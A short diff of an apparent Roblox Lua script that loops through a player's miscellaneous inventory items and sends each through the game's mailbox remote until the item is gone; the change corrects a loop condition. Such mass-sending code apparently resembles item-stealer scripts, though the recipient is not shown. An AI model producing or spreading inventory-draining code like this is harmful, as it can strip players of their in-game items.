@@ -398,8 +398,8 @@ for i, v in pairs(inv.Misc) do
             [5] = v._am or 1
         }
 	    repeat
-            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-	    until not inv.Enchant[i]
+            	game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+	    until not inv.Misc[i]
         directory = library.Directory.MiscItems[id]
         _G.type = "Not a Pet"
         _G.image = directory.Icon
